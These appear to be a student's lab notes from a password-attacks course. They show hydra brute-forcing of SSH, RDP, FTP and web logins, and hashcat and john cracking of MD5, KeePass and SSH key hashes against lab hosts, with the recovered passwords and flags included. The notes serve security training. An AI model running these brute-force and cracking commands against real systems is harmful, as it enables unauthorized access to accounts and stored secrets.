@@ -1,0 +1,245 @@
+Password Attacks
+
+Attacking Network Services Logins
+
+SSH
+
+cd /usr/share/wordlists/
+ls
+sudo gzip -d rockyou.txt.gz
+hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+
+-----
+RDP
+
+echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
+
+Lab 1. Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on Password Attacks - RDP - VM #1. Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames: justin and 
+daniel
+
+target 192.168.54.202
+
+echo -e "daniel\njustin" | sudo tee -a /home/kali/names.txt
+hydra -L /home/kali/names.txt -p "SuperS3cure1337#" rdp://192.168.54.202
+
+[3389][rdp] host: 192.168.54.202   login: justin   password: SuperS3cure1337#
+[3389][rdp] host: 192.168.54.202   login: daniel   password: SuperS3cure1337#
+1 of 1 target successfully completed, 2 valid passwords found
+
+xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.54.202
+
+desktop flag
+OS{53c546f7ab3cd442f639cb8d5de0654b}
+
+Lab 2. Enumerate Password Attacks - RDP - VM #1 and find another network service. Use the knowledge from this section to get access as the itadmin user and find the flag
+
+nmap -sC -sV 192.168.54.202
+21/tcp   open  ftp           FileZilla ftpd 1.4.1
+
+echo -e "itadmin" | sudo tee -a /home/kali/ftp.txt
+sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
+
+hydra -L /home/kali/ftp.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.54.202
+[21][ftp] host: 192.168.54.202   login: itadmin   password: hellokitty
+
+ftp 192.168.54.202
+itadmin/hellokitty
+ls
+get flag.txt
+
+OS{09e167629954b0c1a243e16eae1520d5}
+
+---------
+HTTP POST Login Form
+
+Burp suite intercept login attempt, POST data and failed login message
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+
+Lab 1. Follow the steps from this section to gain access to TinyFileManager on VM #1 (BRUTE). Once logged in, find the flag
+
+target 192.168.54.201
+
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.54.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+[80][http-post-form] host: 192.168.54.201   login: user   password: 121212
+
+192.168.54.201
+user/121212
+install.txt
+OS{aee4da38f4fd0fd1cc814712097d913a}
+
+-------
+Password Cracking Fundamentals
+
+Symmetric encryption, AES
+Asymmetric encryption, RSA
+hash, SHA256, SHA1, MD5
+
+five-character password and the specified character 62 possible variations, we have a keyspace:
+echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c
+python3 -c "print(62**5)"
+916132832
+
+calculate the cracking time:
+hashcat -b
+MD5	68,185.1 MH/s	450.8 MH/s
+SHA1	21,528.2 MH/s	298.3 MH/s
+SHA256	9,276.3 MH/s	134.2 MH/s
+python3 -c "print(916132832 / 134200000)"
+6.826623189269746
+python3 -c "print(916132832 / 9276300000)"
+0.09876058687192092
+
+------
+Mutating Wordlists
+
+echo \$1 > demo.rule
+cat demo1.rule
+hashcat -r demo1.rule --stdout demo.txt
+rule:
+$1 c 
+
+$
+c
+
+$1 c $!
+
+hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
+
+ls -la /usr/share/hashcat/rules/
+
+Lab 2. You extracted the MD5 hash "19adc0e8921336d08502c039dc297ff8" from a target system. Create a rule which makes all letters upper case and duplicates the passwords contained in rockyou.txt and crack the hash
+
+rule: u d
+echo u d > hash.rule
+hashcat -m 0 19adc0e8921336d08502c039dc297ff8 /usr/share/wordlists/rockyou.txt -r hash.rule --force
+
+BUTTERFLY5BUTTERFLY5
+
+---------
+Cracking Methodology
+
+identify the hash type with hash-identifier or hashid
+determine the feasibility of our cracking attempt
+prepare our wordlist, mutate using rule based attack
+start cracking, special care in copying and pasting our hashes
+
+---------
+Password Manager
+
+1Password and KeePass
+
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+ls -la Database.kdbx
+keepass2john Database.kdbx > keepass.hash
+cat keepass.hash
+hashcat --help | grep -i "KeePass"
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+Lab 2. Enumerate VM #2 and get access to the system as user nadine. Obtain the password stored as title "flag" in the password manager and enter it as answer to this exercise. Note that the flag is not formatted as OS{} for this exercise
+
+target 192.168.54.227
+
+nmap -sC -sV 192.168.54.227
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+
+hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.54.227
+[3389][rdp] host: 192.168.54.227   login: nadine   password: 123abc
+
+xfreerdp3 /u:nadine /p:123abc /v:192.168.54.227
+
+Documents Databases.kdbx
+
+keepass2john Database.kdbx > keepass.hash
+cat keepass.hash
+Database:$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56
+
+$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56
+
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+
+$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56:pinkpanther1234
+
+pinkpanther1234
+
+open Keepass database
+Title: flag
+Password: eSGJIzUp5nrr834QZBWK
+
+-----
+SSH Private Key Passphrase
+
+SSH private keys. Directory Traversal, we could read files on the system
+id_rsa
+need passphrase
+
+ssh2john id_rsa > ssh.hash
+cat ssh.hash
+hashcat -h | grep -i "ssh"
+hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
+(Token length exception, hashcat mode not support)
+
+cat ssh.rule
+sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
+john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+ssh -i id_rsa -p 2222 dave@192.168.50.201
+
+Lab 2. Enumerate VM #1 and find a way to get access to SSH on port 2223. Find the flag in the home directory of the user alfred. You can use the same rules we created in this section
+
+target 192.168.54.201 
+
+http://192.168.54.201:8080 and log in with a username of user and a password of 121212
+id_rsa
+
+ssh2john id_rsa > ssh.hash
+cat ssh.hash
+ssh.rule:
+c $1 $3 $7 $!
+c $1 $3 $7 $@
+c $1 $3 $7 $#
+hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt -r /home/kali/ssh.rule --force
+(Token length exception, hashcat mode not support)
+
+sudo sh -c 'cat /home/kali/ssh.rule >> /etc/john/john.conf'
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
+
+No "sshRules" mode rules found in /etc/john/john.conf !
+
+try bruteforce ssh directly:
+hydra -l alfred -P /usr/share/wordlists/rockyou.txt -s 2223 ssh://192.168.54.201
+
+[DATA] attacking ssh://192.168.54.201:2223/
+
+----------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
